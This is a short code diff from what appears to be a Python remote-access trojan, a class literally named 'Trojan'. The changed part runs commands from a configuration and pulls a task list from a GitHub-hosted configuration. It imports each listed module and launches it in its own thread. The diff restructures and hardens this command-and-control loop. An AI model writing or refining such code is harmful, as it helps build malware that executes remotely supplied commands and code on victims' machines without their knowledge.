@@ -96,11 +96,12 @@ class Trojan:
                 for command in nodejs_config.get('commands', []):
                     self.execute_command(command)
 
-                # Check and run modules based on GitHub config
-                github_config = self.get_github_config()
-                for task in github_config.get('modules', []):
-                    module = task['module']
-                    if module not in sys.modules:
+            # Run modules based on GitHub config
+            github_config = self.get_github_config()
+            if isinstance(github_config, list):
+                for task in github_config:
+                    module = task.get('module')
+                    if module and module not in sys.modules:
                         importlib.import_module(module)
                     thread = threading.Thread(target=self.module_runner, args=(module,))
                     thread.start()
